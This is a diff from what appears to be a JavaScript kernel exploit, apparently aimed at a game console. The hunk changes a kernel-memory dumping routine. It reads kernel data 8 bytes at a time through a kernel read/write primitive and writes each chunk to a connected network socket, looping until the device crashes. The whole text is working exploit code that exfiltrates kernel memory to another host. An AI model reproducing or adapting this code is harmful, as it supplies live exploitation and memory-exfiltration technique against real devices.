@@ -610,21 +610,22 @@ async function main(userlandRW, wkOnly = false) {
             let connect_res = await chain.syscall(SYS_CONNECT, dump_sock_fd, dump_sock_addr_store, 0x10);
             await log("[DUMP] Connected: " + connect_res, LogLevel.INFO);
 
-            // Use kdataBase since we know that's readable
-            let dump_page = p.malloc(0x1000);
+            // Use tiny buffer - write 8 bytes at a time directly to socket
+            let dump_buf = p.malloc(0x8);
             let dump_addr = krw.kdataBase;
 
             await log("[DUMP] Starting dump from kdataBase: " + dump_addr, LogLevel.WARN);
             alert("Starting kernel dump from kdataBase...\n\nDump will continue until crash.");
 
             for (let j = 0; ; j++) {
-                // Bulk copy 4KB from kernel to userspace
-                await krw.copyout(dump_addr, dump_page, 0x1000);
-                await chain.syscall(SYS_WRITE, dump_sock_fd, dump_page, 0x1000);
-                dump_addr = dump_addr.add32(0x1000);
+                // Read 8 bytes at a time and send immediately
+                let val = await krw.read8(dump_addr);
+                p.write8(dump_buf, val);
+                await chain.syscall(SYS_WRITE, dump_sock_fd, dump_buf, 0x8);
+                dump_addr = dump_addr.add32(0x8);
 
-                if (j % 256 === 0) {
-                    await log("[DUMP] Progress: 0x" + dump_addr + " (" + (j * 0x1000 / 1024 / 1024).toFixed(1) + " MB)", LogLevel.INFO | LogLevel.FLAG_TEMP);
+                if (j % 0x8000 === 0) {  // Every 256KB
+                    await log("[DUMP] Progress: 0x" + dump_addr + " (" + (j * 8 / 1024 / 1024).toFixed(1) + " MB)", LogLevel.INFO | LogLevel.FLAG_TEMP);
                 }
             }
         }
